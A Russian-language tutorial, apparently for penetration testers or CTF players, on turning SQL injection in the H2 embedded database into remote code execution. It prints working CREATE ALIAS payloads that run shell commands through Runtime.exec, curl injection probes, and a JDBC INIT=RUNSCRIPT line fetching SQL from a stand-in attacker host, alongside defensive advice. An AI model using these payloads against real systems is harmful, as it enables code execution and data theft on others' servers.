## Вопрос, с которого всё начинается

Java-приложение использует встраиваемую базу H2. Ты нашёл SQL-инъекцию. Данные — это уже ценно, но H2 умеет больше: в ней можно **определить свою функцию на Java** прямо из SQL. А если функция на Java, значит, из инъекции можно дойти до исполнения произвольного кода в JVM.

Это одна из самых прямых дорог от SQLi к RCE. H2, HSQLDB и Derby встраиваются в приложение и работают в том же процессе, поэтому «SQL» здесь фактически имеет доступ к Java-платформе.

## Определение H2

H2 выдаёт себя несколькими признаками. Функция `H2VERSION()` возвращает версию. Работает `INFORMATION_SCHEMA` в стандартном виде. Есть специфичные системные таблицы. Пробы:

```
$ curl -s "https://app.target/search?q=1 UNION SELECT H2VERSION(),2-- -"
2.1.214
$ curl -s "https://app.target/search?q=1 UNION SELECT TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES-- -"
USERS
ORDERS
```

H2 также поддерживает `SELECT * FROM INFORMATION_SCHEMA.USERS` и другие стандартные представления.

## CREATE ALIAS: Java в SQL

Ключевая возможность H2 — `CREATE ALIAS`. Она позволяет определить функцию, тело которой — исходный код Java:

```sql
CREATE ALIAS EXEC AS $$
String exec(String cmd) throws Exception {
  return new java.util.Scanner(
    Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
}
$$;
```

После определения функцию можно вызвать прямо в SELECT:

```sql
SELECT EXEC('id');
```

И это вернёт вывод команды. Через SQL-инъекцию можно выполнить `CREATE ALIAS` и затем `SELECT EXEC(...)`.

## Наш пример: от инъекции к команде

Договоримся о примере. Эндпоинт `https://app.target/search?q=...` уязвим. Порядок:

1. **Подтверждаем H2** через `H2VERSION()`.
2. **Создаём алиас** через `; CREATE ALIAS ... --`. Если приложение допускает stacked queries (несколько запросов в одном), это сработает.
3. **Вызываем функцию**: `UNION SELECT EXEC('cat /flag'),2`.
4. **Получаем вывод** в ответе.

Если stacked queries запрещены, `CREATE ALIAS` не выполнить. Тогда ищут другие пути: вызов существующих функций, чтение файлов через `FILE_READ`, или `INIT=RUNSCRIPT` в строке подключения (классическая H2-RCE, где в JDBC URL подсовывают `RUNSCRIPT FROM` с SQL, который создаёт алиас).

## H2 в JDBC URL: классика

Отдельный и очень известный вектор — когда приложение позволяет повлиять на JDBC-URL H2. Тогда добавляют параметр `INIT`:

```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/init.sql'
```

H2 при подключении выполнит SQL из внешнего файла, а там — `CREATE ALIAS` и команда. Этот вектор встречался в Spring Boot, где H2 включён в dev-профиле, и в приложениях, принимающих URL базы из конфигурации.

## Защита

Меры против H2-RCE:

- **Не разрешать stacked queries** в приложении — это блокирует `CREATE ALIAS` через инъекцию.
- **Запретить `INIT`/`RUNSCRIPT`** в JDBC-URL и не принимать URL от пользователя.
- **Не использовать встраиваемые БД в продакшене** или изолировать процесс.
- **Параметризовать запросы** — базовая защита от инъекции, снимающая весь класс.
- **Ограничить права** процесса приложения.

## Что мы теперь знаем

- H2 определяется по `H2VERSION()` и `INFORMATION_SCHEMA`.
- `CREATE ALIAS` определяет Java-функцию прямо из SQL.
- `SELECT EXEC('cmd')` исполняет команду и возвращает вывод.
- Stacked queries нужны для `CREATE ALIAS` через инъекцию.
- JDBC `INIT=RUNSCRIPT` — отдельный вектор RCE.

## Разбор колонок и стандартные представления

H2 поддерживает стандартный `INFORMATION_SCHEMA`, что упрощает снятие схемы. Число колонок определяется через `ORDER BY n` или NULL-подстановку. Типы H2 приводит через `CAST`. После определения числа колонок снимаешь таблицы:

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'
```

H2 также поддерживает `SELECT * FROM INFORMATION_SCHEMA.USERS`, где перечислены пользователи базы. Это удобно для быстрой оценки прав.

Отдельно стоит упомянуть `FILE_READ`: H2 имеет функцию чтения файлов. Если она доступна, чтение файла сервера сводится к одному запросу. Но главная сила H2 — не чтение, а `CREATE ALIAS`, дающий исполнение Java.

## CREATE ALIAS подробнее

`CREATE ALIAS` принимает имя функции и тело на Java. Тело — это исходный код, который компилируется и загружается в JVM. Возможности не ограничены чтением: можно создавать файлы, открывать сокеты, запускать процессы. Именно поэтому H2 так опасна при инъекции.

Синтаксис (упрощённо):

```sql
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
  java.util.Scanner s = new java.util.Scanner(
    Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
}
$$;
```

Затем `CALL SHELLEXEC('id')` или `SELECT SHELLEXEC('id')`. Обрати внимание: внутри тела нельзя использовать строку из трёх долларов, поэтому делимитер выбирают так, чтобы он не встречался в коде.

## Ограничения и обходы

Если stacked queries запрещены, `CREATE ALIAS` через инъекцию не выполнить. Тогда ищут альтернативы. Первая — `INIT=RUNSCRIPT` в JDBC-URL: если приложение позволяет влиять на URL базы, туда добавляют `INIT=RUNSCRIPT FROM 'http://attacker/init.sql'`, и H2 выполнит SQL из файла при подключении. Вторая — существующие алиасы, если они уже определены. Третья — чтение файлов через `FILE_READ`, если RCE недостижим.

Есть и ограничение по версиям: в новых H2 некоторые функции ограничены, а `CREATE ALIAS` может требовать прав администратора базы. Поэтому определяй версию и права до выбора пути.

## Практические замечания

H2 чаще всего встречается в Spring Boot приложениях в dev-профилях или в тестовых конфигурациях. Если приложение использует H2 в продакшене, это уже сигнал, что настройки не для прода. Проверяй страницу `/h2-console` — часто она открыта и без пароля.

В отчёте покажи цепочку: инъекция → `CREATE ALIAS` → исполнение Java → результат. И рекомендуй: параметризация запросов, отключение stacked queries, запрет `INIT`, отказ от H2 в продакшене.

## Итог

H2 — встраиваемая Java-СУБД, где SQL-инъекция превращается в RCE через `CREATE ALIAS`: тело функции пишется на Java и исполняется в JVM. Определяется по `H2VERSION()` и `INFORMATION_SCHEMA`. Для `CREATE ALIAS` через инъекцию нужны stacked queries; альтернатива — параметр `INIT=RUNSCRIPT` в JDBC-URL. Защита: параметризация, отключение stacked queries, запрет `INIT`, отказ от H2 в продакшене. В отчёте показывай цепочку от инъекции до исполнения Java.

## Связь с веткой и резюме

H2 — самая опасная СУБД этой ветки, потому что SQL-инъекция в ней напрямую ведёт к RCE через `CREATE ALIAS`. Вместе с DB2, Firebird и ClickHouse она образует набор нестандартных диалектов, которые нужно уметь распознавать. Ключевые маркеры H2 — `H2VERSION()` и `INFORMATION_SCHEMA`. Ключевая возможность — Java-алиасы и параметр `INIT=RUNSCRIPT`. Если ты видишь в стеке Java-приложение с встраиваемой базой, H2 — первый кандидат для проверки.

## Полный walkthrough: от инъекции до исполнения команды

Разберём сценарий целиком, шаг за шагом, чтобы увидеть всю цепочку.

Шаг первый — находим уязвимый параметр. Проверяем кавычкой: ответ меняется, значит, ввод попадает в SQL. Убеждаемся, что это инъекция, а не фильтрация.

Шаг второй — определяем диалект. Отправляем `H2VERSION()`. Если видим версию вида `2.1.214`, это H2. Дополнительно проверяем `INFORMATION_SCHEMA.TABLES` — она работает в стандартном виде. Диалект подтверждён.

Шаг третий — определяем число колонок через `ORDER BY n` или NULL-подстановку. Как только `UNION SELECT` с нужным числом выполняется, можно двигаться дальше.

Шаг четвёртый — снимаем схему. `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES` даёт список таблиц. `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'` даёт колонки. Фиксируем структуру.

Шаг пятый — проверяем stacked queries. Отправляем `; SELECT 1--`. Если второй запрос выполняется, можно использовать `CREATE ALIAS`. Если нет — ищем обход.

Шаг шестой — создаём алиас. `CREATE ALIAS EXEC AS $$ ... Java ... $$`. Тело функции вызывает `Runtime.getRuntime().exec(cmd)` и возвращает вывод. После создания алиас доступен как функция базы.

Шаг седьмой — вызываем функцию. `UNION SELECT EXEC('cat /flag'),2`. Вывод команды попадает в ответ. Это и есть RCE.

Шаг восьмой — фиксируем результат. Записываем запросы, ответы, вывод команды. В отчёте показываем полную цепочку: инъекция → определение H2 → stacked queries → CREATE ALIAS → EXEC → результат.

## Альтернативы и обходы

Если stacked queries запрещены, цепочка `CREATE ALIAS` через инъекцию недоступна. Тогда рассматриваем альтернативы.

Первая — `INIT=RUNSCRIPT` в JDBC-URL. Если приложение позволяет влиять на строку подключения, добавляем `;INIT=RUNSCRIPT FROM 'http://attacker/init.sql'`. H2 выполнит SQL из внешнего файла при подключении. В файле — `CREATE ALIAS` и команда. Этот вектор требует, чтобы URL был контролируемым, что случается в приложениях, принимающих конфигурацию базы от пользователя или из внешнего источника.

Вторая — существующие алиасы. Если в базе уже определены функции, среди них могут быть опасные. Проверяем `INFORMATION_SCHEMA.FUNCTION_ALIASES` (или аналогичное представление) и смотрим, что доступно.

Третья — чтение файлов через `FILE_READ`. Если RCE недостижим, но функция чтения файлов есть, читаем файлы сервера напрямую. Это тоже серьёзная находка.

Четвёртая — комбинация с другими уязвимостями. Иногда H2-инъекция — часть цепочки, где другая уязвимость даёт возможность влиять на URL или на конфигурацию.

## Ограничения H2 и версии

Возможности H2 зависят от версии и прав. В новых версиях `CREATE ALIAS` может требовать прав администратора базы, а некоторые функции ограничены. Поэтому до выбора пути определяем версию и права.

`CREATE ALIAS` в H2 по умолчанию требует, чтобы пользователь имел право создавать алиасы. В конфигурациях по умолчанию это часто разрешено, но не всегда. Если права недостаточны, алиас не создать.

Версия определяется через `H2VERSION()`. Для старых версий известны конкретные обходы и особенности. Для новых — меньше известных путей, но базовые примитивы (Java-алиасы) сохраняются, потому что они часть дизайна.

Также важно: H2 в режиме in-memory и в режиме файла ведут себя похоже для наших целей, но права и расположение файлов различаются. Для чтения файлов это имеет значение.

## Защита и что рекомендовать

Итоговые рекомендации по защите от H2-RCE: параметризация всех запросов (снимает инъекцию), запрет stacked queries, запрет параметра `INIT` в JDBC-URL и непринятие URL от пользователя, отказ от встраиваемых СУБД в продакшене, ограничение прав учётной записи базы, обновление H2 и закрытие консоли `/h2-console`.

Если хотя бы параметризация внедрена, весь класс уязвимости закрывается. Остальные меры — защита в глубину на случай, если инъекция всё же появится.

## Итоговая шпаргалка

Маркеры H2: `H2VERSION()`, `INFORMATION_SCHEMA`. Число колонок — `ORDER BY n`. Stacked queries — точка с запятой. RCE — `CREATE ALIAS` с Java-телом и вызов функции. Альтернатива — `INIT=RUNSCRIPT`. Чтение файлов — `FILE_READ`. Защита — параметризация и отказ от H2 в продакшене. Этого достаточно, чтобы уверенно работать с H2-инъекцией.
